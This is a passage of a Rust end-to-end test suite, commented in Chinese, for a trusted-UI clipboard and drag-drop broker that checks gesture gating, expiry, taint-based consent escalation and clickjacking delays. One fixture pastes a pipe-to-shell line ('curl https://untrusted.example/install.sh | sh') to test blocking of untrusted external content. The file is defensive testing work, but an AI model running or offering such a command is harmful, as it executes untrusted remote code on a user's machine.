            share_gid,
            app_alpha,
            share_hid,
            ChooserAttenuatedRights::ReadOnly,
            &shell.session,
            22_200,
            &mut auth.audit,
        )
        .expect_err("grant from prior session generation must be invalidated");
    assert_eq!(
        stale_session_grant_err.code,
        TrustedUiErrorCode::ChooserGrantRevoked
    );
}

// ============================================================================
// 5. ClipboardAndDragBroker 手势门禁、过期拦截与跨应用污点自动升级 Z4 ([DUI-CLIP-001])
// ============================================================================

#[test]
fn taint_aware_clipboard_and_drag_drop_gesture_expiry_and_z4_escalation_e2e() {
    let app = AppState::from_session(SessionConfig::default());
    let trusted = TrustedUiState::new();

    let src_app_hex = hex(&[0xD1; 16]);
    let dst_app_hex = hex(&[0xE2; 16]);
    let dst_inst_hex = hex(&[0xF3; 16]);

    // 负例 1：Automation 通道禁止铸造用户剪贴板/拖放手势令牌。
    let auto_gesture_err = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Automation,
        &src_app_hex,
        "CLIPBOARD",
        1_000,
        5_000,
    )
    .expect_err("Automation must not mint human gesture token");
    assert!(
        auto_gesture_err
            .message
            .contains("AUTOMATION_GESTURE_FORBIDDEN")
    );

    // 1. 公开无污点 (PUBLIC) 剪贴板复制与跨应用粘贴 -> 凭有效手势直接释放，无多余弹窗摩擦。
    let copy_gesture = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Keyboard,
        &src_app_hex,
        "CLIPBOARD",
        1_100,
        5_000,
    )
    .expect("mint copy gesture");
    let pub_meta = trusted_ui_publish_transfer_core(
        &trusted,
        &app,
        "CLIPBOARD",
        "text/plain",
        b"Hello public specification".to_vec(),
        &src_app_hex,
        "文档阅读器",
        &["PUBLIC".to_owned()],
        Some(&copy_gesture.gesture_token_id_hex),
        5_000,
        1_120,
    )
    .expect("publish public clipboard");

    // 负例 2：后台无手势静默读取剪贴板 -> MissingUserGesture！
    let silent_read_err = trusted_ui_request_transfer_read_core(
        &trusted,
        &app,
        &pub_meta.transfer_id_hex,
        &dst_app_hex,
        &dst_inst_hex,
        "笔记编辑器",
        None,
        1_200,
    )
    .expect_err("background clipboard read without gesture must fail");
    assert!(silent_read_err.message.contains("MISSING_USER_GESTURE"));

    // 负例 3：重放已消费的 copy_gesture 或盗用其他应用手势 -> InvalidOrExpiredUserGesture！
    let replay_gesture_err = trusted_ui_request_transfer_read_core(
        &trusted,
        &app,
        &pub_meta.transfer_id_hex,
        &dst_app_hex,
        &dst_inst_hex,
        "笔记编辑器",
        Some(&copy_gesture.gesture_token_id_hex),
        1_210,
    )
    .expect_err("replayed/wrong-app gesture must fail");
    assert!(
        replay_gesture_err
            .message
            .contains("INVALID_OR_EXPIRED_USER_GESTURE")
    );

    // 正例：目标应用铸造全新一次性粘贴手势读取 PUBLIC 条目 -> 直接释放。
    let paste_gesture = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Keyboard,
        &dst_app_hex,
        "CLIPBOARD",
        1_250,
        5_000,
    )
    .expect("mint paste gesture");
    let public_read = trusted_ui_request_transfer_read_core(
        &trusted,
        &app,
        &pub_meta.transfer_id_hex,
        &dst_app_hex,
        &dst_inst_hex,
        "笔记编辑器",
        Some(&paste_gesture.gesture_token_id_hex),
        1_260,
    )
    .expect("public cross-app paste succeeds");
    match public_read {
        TransferReadDecisionDto::Released {
            payload_utf8_or_hex,
            ..
        } => assert_eq!(payload_utf8_or_hex, "Hello public specification"),
        other => panic!("expected Released for PUBLIC clipboard, got {other:?}"),
    }

    // 负例 4：过期条目读取 (expires_at = 1_120 + 5_000 = 6_120) -> TransferExpired！
    let late_gesture = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Keyboard,
        &dst_app_hex,
        "CLIPBOARD",
        6_200,
        5_000,
    )
    .expect("mint late gesture");
    let expired_read_err = trusted_ui_request_transfer_read_core(
        &trusted,
        &app,
        &pub_meta.transfer_id_hex,
        &dst_app_hex,
        &dst_inst_hex,
        "笔记编辑器",
        Some(&late_gesture.gesture_token_id_hex),
        6_210,
    )
    .expect_err("expired clipboard item must fail");
    assert!(expired_read_err.message.contains("TRANSFER_EXPIRED"));

    // 2. 跨应用拖放带 CREDENTIALS + CONFIDENTIAL 污点的密钥材料 -> 自动升级到 Z4 安全屏！
    let drag_start_gesture = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::DragDrop,
        &src_app_hex,
        "DRAG_DROP",
        10_000,
        5_000,
    )
    .expect("mint drag start gesture");
    let secret_payload = b"AGE-SECRET-KEY-1QQQQQQQQQQQQQQQQQQQQQQQQQQQQ";
    let tainted_meta = trusted_ui_publish_transfer_core(
        &trusted,
        &app,
        "DRAG_DROP",
        "text/plain",
        secret_payload.to_vec(),
        &src_app_hex,
        "密码保险箱",
        &["CREDENTIALS".to_owned(), "CONFIDENTIAL".to_owned()],
        Some(&drag_start_gesture.gesture_token_id_hex),
        30_000,
        10_050,
    )
    .expect("publish tainted drag-drop");

    let drop_gesture = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::DragDrop,
        &dst_app_hex,
        "DRAG_DROP",
        10_200,
        5_000,
    )
    .expect("mint drop gesture");
    let escalated = trusted_ui_request_transfer_read_core(
        &trusted,
        &app,
        &tainted_meta.transfer_id_hex,
        &dst_app_hex,
        &dst_inst_hex,
        "外部聊天客户端",
        Some(&drop_gesture.gesture_token_id_hex),
        10_220,
    )
    .expect("tainted cross-app drop must return EscalatedToZ4Consent");

    let challenge_id_hex = match escalated {
        TransferReadDecisionDto::EscalatedToZ4Consent {
            challenge_id_hex,
            requires_high_contrast_ack,
            taint_flags,
            ..
        } => {
            assert!(requires_high_contrast_ack);
            assert!(taint_flags.contains(&TaintFlag::Credentials));
            challenge_id_hex
        }
        other => panic!("expected EscalatedToZ4Consent, got {other:?}"),
    };

    // 此时宿主壳 Z4 模态锁必须已被自动激活，且公共态势中零印章泄露。
    let posture =
        trusted_ui_get_public_posture_core(&trusted, &app, 10_220).expect("public posture");
    assert!(posture.z4_modal_active);
    assert_eq!(
        posture.active_challenge_id_hex.as_deref(),
        Some(challenge_id_hex.as_str())
    );

    // 负例 5：在用户完成 Z4 批准前抢先拉取升级载荷 -> 零字节释放！
    let premature_err = trusted_ui_complete_escalated_transfer_core(
        &trusted,
        &app,
        &tainted_meta.transfer_id_hex,
        &dst_app_hex,
        &challenge_id_hex,
        10_250,
    )
    .expect_err("must block bytes before Z4 approval");
    assert!(
        premature_err
            .message
            .contains("TRANSFER_CONSENT_MISMATCH_OR_DENIED")
    );

    // 负例 6：Z4 焦点重获重置 350ms 计时后过早点击确认 -> 拒绝！
    trusted_ui_notify_z4_focus_regained_core(
        &trusted,
        &app,
        TrustedUiCallerOrigin::TcbTrustedBroker,
        &challenge_id_hex,
        10_300,
    )
    .expect("notify focus regained");
    let too_fast_z4_err = trusted_ui_decide_z4_consent_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Pointer,
        &challenge_id_hex,
        true,
        Some(ConsentGrantScope::SingleAction),
        true,
        10_600, // 300ms < 350ms
    )
    .expect_err("must enforce 350ms after focus regain");
    assert!(
        too_fast_z4_err
            .message
            .contains("CLICKJACKING_ARMING_ACTIVE")
    );

    // 正例：>= 350ms 后携带显式不可逆确认通过 Z4，随后成功释放单次载荷并自动解除 Z4 模态锁。
    let z4_receipt = trusted_ui_decide_z4_consent_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Pointer,
        &challenge_id_hex,
        true,
        Some(ConsentGrantScope::SingleAction),
        true,
        10_660,
    )
    .expect("approve Z4 escalated transfer");
    assert_eq!(z4_receipt.state, Z4ChallengeState::Approved);

    let posture_after =
        trusted_ui_get_public_posture_core(&trusted, &app, 10_660).expect("posture after");
    assert!(!posture_after.z4_modal_active);

    let released = trusted_ui_complete_escalated_transfer_core(
        &trusted,
        &app,
        &tainted_meta.transfer_id_hex,
        &dst_app_hex,
        &challenge_id_hex,
        10_670,
    )
    .expect("release tainted bytes after Z4 approval");
    match released {
        TransferReadDecisionDto::Released {
            payload_utf8_or_hex,
            byte_length,
            ..
        } => {
            assert_eq!(byte_length, secret_payload.len());
            assert_eq!(payload_utf8_or_hex.as_bytes(), secret_payload);
        }
        other => panic!("expected Released after Z4 approval, got {other:?}"),
    }

    // 负例 7：同一批准挑战禁止二次重复提取载荷（单次释放契约）。
    let replay_release_err = trusted_ui_complete_escalated_transfer_core(
        &trusted,
        &app,
        &tainted_meta.transfer_id_hex,
        &dst_app_hex,
        &challenge_id_hex,
        10_680,
    )
    .expect_err("one-shot escalation must not release twice");
    assert!(
        replay_release_err
            .message
            .contains("TRANSFER_CONSENT_MISMATCH_OR_DENIED")
    );

    // 3. UNTRUSTED_EXTERNAL 污点跨应用粘贴，但用户在 Z4 按 0ms Escape 拒绝 -> 释放 0 字节！
    let ext_copy_g = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Pointer,
        &src_app_hex,
        "CLIPBOARD",
        12_000,
        5_000,
    )
    .expect("gesture");
    let ext_meta = trusted_ui_publish_transfer_core(
        &trusted,
        &app,
        "CLIPBOARD",
        "text/plain",
        b"curl https://untrusted.example/install.sh | sh".to_vec(),
        &src_app_hex,
        "外部浏览器",
        &["UNTRUSTED_EXTERNAL".to_owned()],
        Some(&ext_copy_g.gesture_token_id_hex),
        30_000,
        12_010,
    )
    .expect("publish untrusted external");
    let ext_paste_g = trusted_ui_mint_gesture_token_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Keyboard,
        &dst_app_hex,
        "CLIPBOARD",
        12_100,
        5_000,
    )
    .expect("paste gesture");
    let ext_esc = trusted_ui_request_transfer_read_core(
        &trusted,
        &app,
        &ext_meta.transfer_id_hex,
        &dst_app_hex,
        &dst_inst_hex,
        "系统终端",
        Some(&ext_paste_g.gesture_token_id_hex),
        12_110,
    )
    .expect("escalates untrusted external paste");
    let ext_cid = match ext_esc {
        TransferReadDecisionDto::EscalatedToZ4Consent {
            challenge_id_hex, ..
        } => challenge_id_hex,
        other => panic!("expected escalation, got {other:?}"),
    };

    // 0ms Escape 取消后，尝试完成提取必须被拒绝。
    trusted_ui_decide_z4_consent_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Keyboard,
        &ext_cid,
        false,
        None,
        false,
        12_110,
    )
    .expect("0ms Escape cancel");
    let denied_release = trusted_ui_complete_escalated_transfer_core(
        &trusted,
        &app,
        &ext_meta.transfer_id_hex,
        &dst_app_hex,
        &ext_cid,
        12_500,
    )
    .expect_err("cancelled Z4 challenge must release 0 bytes");
    assert!(
        denied_release
            .message
            .contains("TRANSFER_CONSENT_MISMATCH_OR_DENIED")
    );

    // 校验全链路安全审计计数器非零且精确可观测。
    let audit = trusted_ui_get_security_audit_core(&trusted).expect("audit counters");
    assert_eq!(audit.transfers_published, 3);
    assert_eq!(audit.escalated_tainted_transfers, 2);
    assert!(audit.rejected_missing_gesture_reads >= 3);
    assert_eq!(audit.rejected_expired_transfer_reads, 1);
    assert_eq!(audit.rejected_clickjacking_arming_attempts, 1);

    // 验证 Tauri _core 选择器与吊销命令回环同样贯通。
    let chooser_dto = trusted_ui_open_chooser_core(
        &trusted,
        &app,
        TrustedUiCallerOrigin::TcbTrustedBroker,
        &dst_app_hex,
        "笔记编辑器",
        "OPEN",
        "READ_ONLY",
        15_000,
        20_000,
    )
    .expect("open chooser via core");
    let grant_dto = trusted_ui_confirm_chooser_grant_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Pointer,
        &chooser_dto.chooser_session_id_hex,
        &[hex(&[0x11; 16])],
        None,
        None,
        20_400,
    )
    .expect("confirm chooser via core");
    trusted_ui_revoke_chooser_grant_core(&trusted, &grant_dto.grant_id_hex)
        .expect("revoke chooser via core");

    // 同时验证直接调用 trusted_ui_open_z4_consent_core 与 TransferChannelKind 枚举断言贯通。
    assert_eq!(pub_meta.channel, TransferChannelKind::Clipboard);
    let direct_z4 = trusted_ui_open_z4_consent_core(
        &trusted,
        &app,
        TrustedUiCallerOrigin::TcbTrustedBroker,
        sample_z4_request(ReversibilityClass::LosslessUndo),
        30_000,
    )
    .expect("open Z4 consent via core");
    let cancel_direct = trusted_ui_decide_z4_consent_core(
        &trusted,
        &app,
        InputOrigin::TrustedShell,
        InputSource::Keyboard,
        &direct_z4.challenge_id_hex,
        false,
        None,
        false,
        30_000,
    )
    .expect("cancel direct Z4 via core");
    assert_eq!(cancel_direct.state, Z4ChallengeState::CancelledByUser);
}
